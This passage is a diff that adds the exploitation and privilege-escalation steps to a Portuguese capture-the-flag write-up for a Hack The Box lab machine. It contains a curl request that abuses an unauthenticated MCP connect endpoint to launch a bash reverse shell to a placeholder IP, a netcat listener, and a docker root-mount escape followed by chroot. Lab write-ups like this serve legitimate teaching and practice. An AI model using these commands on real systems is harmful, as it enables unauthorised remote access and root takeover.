@@ -18,3 +18,56 @@ Descobri dois subdomínios e o que mais chamou atenção foi o "mcp.kobold". Ace
 A vulnerabilidade está no endpoint "/api/mcp/connect": Ele aceita um payload JSON com o objeto "serverConfig" que especifica comandos e argumentos para executar. Como não há validação e autenticação nos comandos e argumentos, qualquer um pode passar comandos shell e conseguir um RCE.
 
 ## Exploração
+
+Realizando o exploit:
+
+```bash
+##Abrindo um listener com o netcat
+nc -lnvp 4444
+
+##Realizando o RCE:
+
+curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
+    -H "Content-Type: application/json" \
+    -d '{"serverId": "shell1", "serverConfig": {"command": "bash", "args": ["-c", "bash -i >& /dev/tcp/<YOURIP>/4444 0>&1"], "
+```
+
+Consegui um shell no host como usuário "ben":
+<img width="454" height="49" alt="ben uid" src="https://github.com/user-attachments/assets/c627fac6-d65c-49f6-8764-b20d832bec2d" />
+
+Extraí a user flag:
+<img width="323" height="46" alt="user" src="https://github.com/user-attachments/assets/ea29e5c0-b719-4fec-ba3b-707b564b51ec" />
+
+Estabilizei a shell utilizando python:  
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+## Escalação de privilégios
+Ao enumerar o host, descobri que o docker está em execução mas não podemos interagir porque "ben" não está no grupo docker. Consegui mudar o grupo ativo do ben com:
+```bash
+newgrp docker
+```
+O que nos da permissão para iniciar um container.
+```bash
+docker ps
+```
+<img width="1131" height="98" alt="container image" src="https://github.com/user-attachments/assets/30acb968-9546-4167-b900-6888dedb0c03" />
+
+ Descobri que havia uma imagem já instalada no host: "privatebin/nginx-fpm-alpine:2.0.2", então a utilizei para iniciar o container docker.  
+
+ Montei todos os arquivos do sistema host para o diretório /mnt no container e rodei ele como root:
+
+ ```bash
+docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
+```
+Já no container, defini o diretório /mnt como raíz do sistema:
+```bash
+chroot /mnt sh
+```
+
+Assim, consegui acesso completo aos arquivos do host como root e extraí a root flag:
+<img width="285" height="113" alt="rootflag" src="https://github.com/user-attachments/assets/b4d624ee-f349-4b88-a7f2-abc6b90cce71" />
+
+Finalizando essa máquina.
+
